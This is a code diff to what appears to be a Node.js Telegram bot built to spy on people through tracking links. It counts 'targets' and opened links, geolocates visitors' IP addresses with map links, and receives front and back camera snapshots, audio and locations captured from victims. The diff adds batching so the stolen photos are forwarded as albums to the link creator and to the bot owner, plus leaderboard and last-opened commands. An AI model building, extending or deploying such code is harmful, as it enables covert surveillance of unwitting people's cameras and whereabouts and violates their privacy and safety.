@@ -6,7 +6,7 @@ const express = require("express");
 function loadJSON(file, def) {
   try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return def; }
 }
-function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }
+function saveJSON(file, data) { fs.writeFile(file, JSON.stringify(data), ()=>{}); }
 
 const USERS_FILE      = "./users.json";
 const BANNED_FILE     = "./banned.json";
@@ -52,6 +52,7 @@ setInterval(() => {
 function incUserStat(uid, field) {
   if (!userStats[uid]) userStats[uid] = { linksCreated:0, linksOpened:0 };
   userStats[uid][field] = (userStats[uid][field] || 0) + 1;
+  if (field === 'linksOpened') userStats[uid].lastOpen = new Date().toJSON().slice(0,19).replace('T',' ');
   saveUserStats();
 }
 
@@ -179,11 +180,16 @@ function getIP(req) {
   return req.ip;
 }
 
+const _ipCache = new Map();
 async function enrichIP(ip) {
+  const cached = _ipCache.get(ip);
+  if (cached && Date.now() < cached.expiry) return cached.info;
   try {
     const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
     if (d.status === "success") {
-      return `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
+      const info = `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
+      _ipCache.set(ip, { info, expiry: Date.now() + 24*3600*1000 });
+      return info;
     }
   } catch(e) {}
   return null;
@@ -212,8 +218,10 @@ setInterval(() => {
   const now = new Date();
   if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
     const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+    const topU = Object.entries(userStats).sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,3)
+      .map(([id,u],i)=>{ const p=profiles[id]||{}; return `${['🥇','🥈','🥉'][i]} ${p.name||id}: ${u.linksOpened||0}`; }).join(" | ")||"—";
     bot.sendMessage(BOT_OWNER,
-      `📅 تقرير يومي تلقائي\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور المستلمة: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
+      `📅 تقرير يومي — ${new Date().toJSON().slice(0,10)}\n━━━━━━━━━━━━━━━\n👥 مستخدمون: ${users.size}  🎯 أهداف: ${targets.size}  🚫 محجوب: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط: ${stats.linksCreated} منشأة / ${stats.linksOpened} مفتوحة\n📷 صور: ${stats.camsnaps}  🎙️ صوت: ${stats.audios}  📍 مواقع: ${stats.locations}\n━━━━━━━━━━━━━━━\n🏆 الأكثر نشاطاً: ${topU}\n🔕 صامت: ${settings.silentMode?'مفعّل':'معطّل'}  ⏱️ تشغيل: ${h}س ${m}د`
     ).catch(() => {});
   }
 }, 60 * 1000);
@@ -361,17 +369,24 @@ bot.on('message', async (msg) => {
 
   if (msg.text === "/stats") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60), s2 = up%60;
+    const bar = (v, max, len=10) => { const f=Math.round((v/Math.max(max,1))*len); return '█'.repeat(f)+'░'.repeat(len-f); };
+    const mx = Math.max(stats.linksOpened, stats.camsnaps, stats.locations, stats.audios, 1);
     return bot.sendMessage(chatId,
-      `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور المستلمة: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n\n🔕 الصامت: ${settings.silentMode ? 'مفعّل 🔴' : 'معطّل 🟢'}\n🌙 الغياب: ${settings.awayMode ? 'مفعّل 🟡' : 'معطّل'}\n📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
+      `📊 إحصائيات البوت\n━━━━━━━━━━━━━━━\n👥 المستخدمون: ${users.size}  🎯 الأهداف: ${targets.size}  🚫 محجوب: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط منشأة:  ${stats.linksCreated}\n👁️ روابط مفتوحة: ${stats.linksOpened}\n${bar(stats.linksOpened,mx)}\n📷 صور كاميرا:   ${stats.camsnaps}\n${bar(stats.camsnaps,mx)}\n📍 مواقع:        ${stats.locations}\n${bar(stats.locations,mx)}\n🎙️ تسجيلات:      ${stats.audios}\n${bar(stats.audios,mx)}\n━━━━━━━━━━━━━━━\n🔕 صامت: ${settings.silentMode?'🔴 مفعّل':'🟢 معطّل'}  🌙 غياب: ${settings.awayMode?'🟡 مفعّل':'معطّل'}\n📅 تقرير يومي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د ${s2}ث`
     );
   }
 
   if (msg.text === "/report") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+    const now = new Date().toJSON().slice(0,19).replace('T',' ');
+    const topUsers = Object.entries(userStats)
+      .sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,3)
+      .map(([id,u],i)=>{ const p=profiles[id]||{}; return `${['🥇','🥈','🥉'][i]} ${p.name||id}: ${u.linksOpened||0} فتحة`; }).join("\n");
+    const targetsList = [...targets].map(id=>{ const p=profiles[String(id)]||{}; return `🎯 ${p.name||id}`; }).join(", ")||"لا يوجد";
     return bot.sendMessage(chatId,
-      `📋 تقرير شامل — ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف (${targets.size}): ${[...targets].join(", ") || "لا يوجد"}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n⏱️ التشغيل: ${h}س ${m}د`
+      `📋 تقرير شامل\n🕒 ${now} UTC\n━━━━━━━━━━━━━━━\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targetsList}\n🚫 المحجوبون: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط منشأة: ${stats.linksCreated}\n👁️ روابط مفتوحة: ${stats.linksOpened}\n📷 صور: ${stats.camsnaps}  🎙️ صوت: ${stats.audios}  📍 مواقع: ${stats.locations}\n━━━━━━━━━━━━━━━\n🏆 الأكثر نشاطاً:\n${topUsers||'لا يوجد بيانات'}\n━━━━━━━━━━━━━━━\n⏱️ التشغيل: ${h}س ${m}د`
     );
   }
 
@@ -578,6 +593,46 @@ bot.on('message', async (msg) => {
     return sendFeaturesMenu(chatId);
   }
 
+  // /lastopen — آخر فتح لكل مستخدم
+  if (msg.text === "/lastopen") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const list = Object.entries(userStats)
+      .filter(([,u]) => u.lastOpen)
+      .sort((a,b) => (b[1].lastOpen||'').localeCompare(a[1].lastOpen||''))
+      .slice(0,20)
+      .map(([id,u],i) => {
+        const p = profiles[id]||{};
+        return `${i+1}. ${p.name||id} — ${u.lastOpen} UTC (${u.linksOpened||0}x)`;
+      }).join("\n");
+    return bot.sendMessage(chatId, list ? `🕐 آخر فتح للروابط:\n\n${list}` : "لا توجد بيانات بعد.");
+  }
+
+  // /top — الأكثر نشاطاً
+  if (msg.text === "/top") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const sorted = Object.entries(userStats)
+      .sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,10);
+    if (!sorted.length) return bot.sendMessage(chatId, "لا توجد بيانات.");
+    const medals = ['🥇','🥈','🥉'];
+    const list = sorted.map(([id,u],i) => {
+      const p = profiles[id]||{};
+      const medal = medals[i]||`${i+1}.`;
+      return `${medal} ${p.name||id}${p.username?' '+p.username:''}\n   👁️ ${u.linksOpened||0} فتحة | 🔗 ${u.linksCreated||0} رابط`;
+    }).join("\n");
+    return bot.sendMessage(chatId, `🏆 الأكثر نشاطاً (${sorted.length}):\n\n${list}`);
+  }
+
+  // /cleardata [id] — مسح بيانات مستخدم معين
+  if (msg.text?.startsWith("/cleardata")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = msg.text.replace("/cleardata","").trim();
+    if (!id) return bot.sendMessage(chatId, "⚠️ استخدم: /cleardata [ID]");
+    delete userStats[id]; saveUserStats();
+    delete profiles[id];  saveProfiles();
+    delete notes[id];     saveNotes();
+    return bot.sendMessage(chatId, `🗑️ تم مسح بيانات \`${id}\` (إحصائيات + ملف شخصي + ملاحظات)`, { parse_mode:"Markdown" });
+  }
+
   // /search [نص] — ابحث عن مستخدم باسمه أو يوزرنيمه
   if (msg.text?.startsWith("/search")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
@@ -775,18 +830,71 @@ app.post("/", (req, res) => {
   } else res.send("Missing");
 });
 
+// Camera snap buffer: collect all snaps then send as album
+const _camBuf = new Map(); // tid -> { snaps:[{buf,cam}], timer }
+
+function flushCamAlbum(tid) {
+  const entry = _camBuf.get(tid);
+  if (!entry || !entry.snaps.length) { _camBuf.delete(tid); return; }
+  const snaps = entry.snaps;
+  _camBuf.delete(tid);
+  stats.camsnaps += snaps.length; saveStats();
+
+  const ts = new Date().toJSON().slice(11,19) + " UTC";
+  const frontN = snaps.filter(s=>s.cam==="front").length;
+  const backN  = snaps.filter(s=>s.cam==="back").length;
+
+  if (snaps.length === 1) {
+    const {buf,cam} = snaps[0];
+    const cap = (cam==="back"?"📷 خلفية":"🤳 أمامية") + ` | ${ts}`;
+    const info = { filename:"snap.png", contentType:"image/png" };
+    if (!settings.silentMode) {
+      bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
+      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
+    }
+    return;
+  }
+
+  // Send as media group album
+  const albumCap = `📸 ${snaps.length} صور | 🤳${frontN} أمامية  📷${backN} خلفية\n🕒 ${ts}`;
+  const media = snaps.map((s,i) => ({
+    type: "photo",
+    media: s.buf,
+    ...(i===0 ? { caption: albumCap } : {})
+  }));
+  if (!settings.silentMode) {
+    bot.sendMediaGroup(tid, media).catch(() => {
+      snaps.forEach(s => {
+        const info = { filename:"snap.png", contentType:"image/png" };
+        bot.sendPhoto(tid, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}` }, info).catch(()=>{});
+      });
+    });
+    if (tid !== BOT_OWNER) {
+      const ownerMedia = snaps.map((s,i) => ({
+        type: "photo", media: s.buf,
+        ...(i===0 ? { caption: `${albumCap}\n(ID: ${tid})` } : {})
+      }));
+      bot.sendMediaGroup(BOT_OWNER, ownerMedia).catch(() => {
+        snaps.forEach(s => {
+          bot.sendPhoto(BOT_OWNER, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}\n(ID: ${tid})` }, { filename:"snap.png", contentType:"image/png" }).catch(()=>{});
+        });
+      });
+    }
+  }
+}
+
 app.post("/camsnap", (req, res) => {
-  const uid  = decodeURIComponent(req.body.uid)  || null;
-  const img  = decodeURIComponent(req.body.img)  || null;
-  const cam  = decodeURIComponent(req.body.cam)  || "front";
+  const uid = decodeURIComponent(req.body.uid) || null;
+  const img = decodeURIComponent(req.body.img) || null;
+  const cam = decodeURIComponent(req.body.cam) || "front";
   if (uid && img) {
-    stats.camsnaps++; saveStats();
-    const buffer = Buffer.from(img, 'base64');
-    const info   = { filename: "camsnap.png", contentType: 'image/png' };
-    const tid    = parseInt(uid, 36);
-    const cap    = cam === "back" ? "📷 كاميرا خلفية" : "🤳 كاميرا أمامية";
-    notifyPhoto(tid, buffer, { caption: cap }, info);
-    if (tid !== BOT_OWNER) notifyPhoto(BOT_OWNER, buffer, { caption: `${cap} (ID: ${tid})` }, info);
+    const tid = parseInt(uid, 36);
+    const buf = Buffer.from(img, 'base64');
+    if (!_camBuf.has(tid)) _camBuf.set(tid, { snaps:[], timer:null });
+    const entry = _camBuf.get(tid);
+    entry.snaps.push({ buf, cam });
+    if (entry.timer) clearTimeout(entry.timer);
+    entry.timer = setTimeout(() => flushCamAlbum(tid), 13000);
     res.send("Done");
   } else res.send("Missing");
 });
@@ -888,11 +996,14 @@ app.listen(5000, async () => {
       { command: "stats",     description: "📊 الإحصائيات" },
       { command: "report",    description: "📋 تقرير شامل" },
       { command: "users",     description: "👥 المستخدمون" },
+      { command: "top",       description: "🏆 الأكثر نشاطاً" },
+      { command: "lastopen",  description: "🕐 آخر فتح للروابط" },
       { command: "targets",   description: "🎯 الأهداف" },
       { command: "broadcast", description: "📢 إرسال للجميع" },
       { command: "silent",    description: "🔕 الوضع الصامت" },
       { command: "ping",      description: "🏓 اختبار السرعة" },
-      { command: "export",    description: "📤 تصدير البيانات" }
+      { command: "export",    description: "📤 تصدير البيانات" },
+      { command: "cleardata", description: "🗑️ مسح بيانات مستخدم" }
     ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});
 
     const up = new Date().toISOString();
